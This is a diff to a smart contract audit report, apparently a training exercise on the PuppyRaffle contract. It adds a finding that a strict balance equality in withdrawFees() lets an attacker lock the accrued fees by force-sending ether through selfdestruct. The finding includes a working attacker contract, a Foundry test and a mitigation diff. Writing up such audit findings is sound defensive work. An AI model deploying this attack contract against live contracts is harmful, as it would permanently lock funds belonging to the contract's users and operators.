@@ -328,12 +328,70 @@ Implement chainlink veriable randomness [Chainlink_vrk](https://chain.link/vrf)
 Note: onchain seeds are pre-deterministic
 
 
-### [S-#] TITLE (Root Cause + Impact)
+### [M-#] Dangerous strict equalities that can be easily manipulated could "permanently" lock the total fee accrued inside the contract.
 
 **Description:** 
+Using strict equalities in `PuppyRaffle::withdrawFees()` to determine when to withdraw the accrued fees can be exploited by a malicious user by externally modifying `address(this).balance` using self-destruct
 
 **Impact:** 
 
+`PuppyRaffle::totalFees` accrued would be "permanently" locked inside the contract 
+
 **Proof of Concept:**
 
+<details>
+
+<summary> Proof of Code </summary>
+
+Add this code to PuppyRaffleTest.t.sol
+
+```javascript
+ function test_DangerousEqualities() public {
+        DangerousEqualities DContract = new DangerousEqualities(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 2 ether);
+        vm.startPrank(attacker);
+        DContract.attack{value: 2 ether}();
+        vm.stopPrank();
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+        //not the same, hence the revert
+        console.log(address(puppyRaffle).balance);
+        console.log(puppyRaffle.totalFees());
+      
+    }
+
+contract DangerousEqualities {
+    PuppyRaffle _puppyRaffle;
+
+    constructor(PuppyRaffle puppyRaffle) {
+        _puppyRaffle = puppyRaffle;
+    }
+
+    function attack() public payable {
+        address payable malicious = payable(address(_puppyRaffle));
+        selfdestruct(malicious);
+    }
+}
+
+```
+</details>
+
+
 **Recommended Mitigation:** 
+
+```diff
+    function withdrawFees() external {
+-      require(
+-            address(this).balance == uint256(totalFees),
+-           "PuppyRaffle: There are currently players active!"
+-       );
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+
+        // slither-disable-next-line arbitrary-send-eth
+        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+```
